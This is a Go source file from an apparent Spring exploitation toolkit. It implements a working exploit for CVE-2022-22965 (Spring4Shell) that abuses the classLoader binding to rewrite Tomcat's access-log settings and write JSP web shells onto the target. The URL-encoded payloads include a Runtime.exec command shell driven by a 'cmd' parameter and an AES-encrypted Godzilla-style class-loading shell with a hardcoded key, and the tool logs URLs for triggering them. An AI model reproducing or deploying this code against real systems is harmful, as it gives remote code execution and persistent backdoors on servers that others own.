package _022

import (
	req2 "github.com/SummerSec/SpringExploit/cmd/commons/req"
	"github.com/SummerSec/SpringExploit/cmd/commons/utils"
	"github.com/fatih/structs"
	"github.com/imroc/req/v3"
	log "github.com/sirupsen/logrus"
	"net/url"
	"time"
)

type CVE202222965 struct{}

const (
	body    = "class.module.classLoader.resources.context.parent.pipeline.first.pattern="
	context = "%25%7Bprefix%7Di%20java.io.InputStream%20in%20%3D%20%25%7Bc%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%25%7Bsuffix%7Di"
	//body1   = "&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix="
	body1 = "&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=G:\\source\\spring-framework-rce\\target\\spring_framework_rce-0.0.1-SNAPSHOT\\&class.module.classLoader.resources.context.parent.pipeline.first.prefix="
	// 添加 shell 文件名
	body2 = "&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
	//behinder = "%25%7Bprefix%7Di%20%40page%20import%3D%22java.util.*%2Cjavax.crypto.*%2Cjavax.crypto.spec.*%22%25%7Bsuffix%7Di%20%25%7Bprefix%7Di%20!class%20U%20extends%20ClassLoader%7BU(ClassLoader%20c)%7Bsuper(c)%3B%7Dpublic%20Class%20g(byte%20%5B%5Db)%7Breturn%20super.defineClass(b%2C0%2Cb.length)%3B%7D%7D%25%7Bsuffix%7Di%25%7Bprefix%7Di%20if%20(request.getMethod().equals(%22POST%22))%7BString%20k%3D%22e45e329feb5d925b%22%3Bsession.putValue(%22u%22%2Ck)%3BCipher%20c%3DCipher.getInstance(%22AES%22)%3Bc.init(2%2Cnew%20SecretKeySpec(k.getBytes()%2C%22AES%22))%3Bnew%20U(this.getClass().getClassLoader()).g(c.doFinal(new%20sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext)%3B%7D%25%7Bsuffix%7Di"

	// 哥斯拉 pass key
	beichen        = "%25%7Bprefix%7Di!%20String%20xc%3D%223c6e0b8a9c15224a%22%3B%20class%20X%20extends%20ClassLoader%7Bpublic%20X(ClassLoader%20z)%7Bsuper(z)%3B%7Dpublic%20Class%20Q(byte%5B%5D%20cb)%7Breturn%20super.defineClass(cb%2C%200%2C%20cb.length)%3B%7D%20%7Dpublic%20byte%5B%5D%20x(byte%5B%5D%20s%2Cboolean%20m)%7B%20try%7Bjavax.crypto.Cipher%20c%3Djavax.crypto.Cipher.getInstance(%22AES%22)%3Bc.init(m%3F1%3A2%2Cnew%20javax.crypto.spec.SecretKeySpec(xc.getBytes()%2C%22AES%22))%3Breturn%20c.doFinal(s)%3B%20%7Dcatch%20(Exception%20e)%7Breturn%20null%3B%20%7D%7D%25%7Bsuffix%7Di%25%7Bprefix%7Ditry%7Bbyte%5B%5D%20data%3Dnew%20byte%5BInteger.parseInt(request.getHeader(%22Content-Length%22))%5D%3Bjava.io.InputStream%20inputStream%3D%20request.getInputStream()%3Bint%20_num%3D0%3Bwhile%20((_num%2B%3DinputStream.read(data%2C_num%2Cdata.length))%3Cdata.length)%3Bdata%3Dx(data%2C%20false)%3Bif%20(session.getAttribute(%22payload%22)%3D%3Dnull)%7Bsession.setAttribute(%22payload%22%2Cnew%20X(this.getClass().getClassLoader()).Q(data))%3B%7Delse%7Brequest.setAttribute(%22parameters%22%2C%20data)%3BObject%20f%3D((Class)session.getAttribute(%22payload%22)).newInstance()%3Bjava.io.ByteArrayOutputStream%20arrOut%3Dnew%20java.io.ByteArrayOutputStream()%3Bf.equals(arrOut)%3Bf.equals(pageContext)%3Bf.toString()%3Bresponse.getOutputStream().write(x(arrOut.toByteArray()%2C%20true))%3B%7D%20%7Dcatch%20(Exception%20e)%7B%7D%25%7Bsuffix%7Di"
	file_date_data = "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=_"
	pattern_data   = "class.module.classLoader.resources.context.parent.pipeline.first.pattern="
)

func (p CVE202222965) SendPoc(target string, hashmap map[string]interface{}) {
	shellname := utils.GetCode(6)
	time.Sleep(time.Second * 1)
	shellname1 := utils.GetCode(8)
	log.Debugf("shellname: %s", shellname)
	log.Debugf("shellname1: %s", shellname1)
	payload1 := body + context + body1 + shellname + body2
	rebeyond := body + beichen + body1 + shellname1 + body2
	//TODO implement me
	log.Debugf("[+] Running CVE202222965 poc")
	reqinfo := req2.NewReqInfo()
	reqmap := structs.Map(reqinfo)
	get_headers := map[string]string{
		"suffix":     "%>",
		"c":          "Runtime",
		"prefix":     "<%",
		"User-Agent": utils.GetUA(),
	}
	post_get_headers := map[string]string{
		"User-Agent":   utils.GetUA(),
		"Content-Type": "application/x-www-form-urlencoded",
	}

	reqmap["url"] = target

	// 默认配置
	reqmap["timeout"] = hashmap["Timeout"].(int)
	reqmap["retry"] = hashmap["Retry"].(int)
	reqmap["proxy"] = hashmap["Proxy"].(string)
	reqmap["mode"] = hashmap["Mode"].(int)
	reqmap["h1"] = hashmap["H1"].(bool)
	f := 0
	for f < 2 {
		time.Sleep(time.Second * 1)
		//  设置 payload
		reqmap["method"] = "POST"
		reqmap["body"] = file_date_data
		reqmap["headers"] = post_get_headers
		utils.Send(reqmap)

		if f == 0 {
			// 第二个请求
			//reqmap["body"] = payload1
			reqmap["body"] = rebeyond
			reqmap["headers"] = post_get_headers

		} else {
			reqmap["body"] = payload1
			reqmap["headers"] = post_get_headers
		}
		utils.Send(reqmap)
		// Changes take some time to populate on tomcat
		time.Sleep(time.Second * 3)

		r, _ := url.Parse(target)
		log.Info("[+] CVE202222965 poc success")
		res := target + " 可能存在CVE202222965没有进行验证 手动验证: " + r.Scheme + "://" + r.Host + "/" + shellname + ".jsp" + "?cmd=whoami or " + r.Scheme + "://" + r.Host + "/" + shellname1 + ".jsp 哥斯拉 pass key  "
		log.Info(res)
		p.SaveResult(res, hashmap["Out"].(string))

		// 第三个请求
		reqmap["method"] = "GET"
		reqmap["body"] = ""
		reqmap["headers"] = get_headers
		utils.Send(reqmap)

		time.Sleep(time.Second * 1)
		reqmap["body"] = pattern_data
		reqmap["method"] = "POST"
		reqmap["headers"] = post_get_headers
		utils.Send(reqmap)
		f++
	}
}

func (p CVE202222965) SaveResult(target string, file string) {
	err := utils.SaveToFile(target, file)
	if err != nil {
		log.Debugf("[-] Save result failed")
		log.Debugf(err.Error())
		return
	}
}

func (p CVE202222965) CheckExp(resp *req.Response, target string, hashmap map[string]interface{}) bool {
	if resp.IsSuccess() {
		return true
	}
	return false
}
